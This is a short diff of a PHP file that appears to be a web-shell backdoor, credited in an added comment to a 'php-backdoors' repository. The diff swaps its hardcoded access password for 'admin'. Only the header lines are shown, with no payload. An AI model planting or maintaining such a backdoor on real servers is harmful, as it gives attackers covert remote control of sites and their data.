@@ -1,5 +1,6 @@
 <?php
-$password = "kmkl4y"; 
+// from https://github.com/1337r0j4n/php-backdoors
+$password = "admin"; 
 session_start();
 error_reporting(0);
 set_time_limit(0);
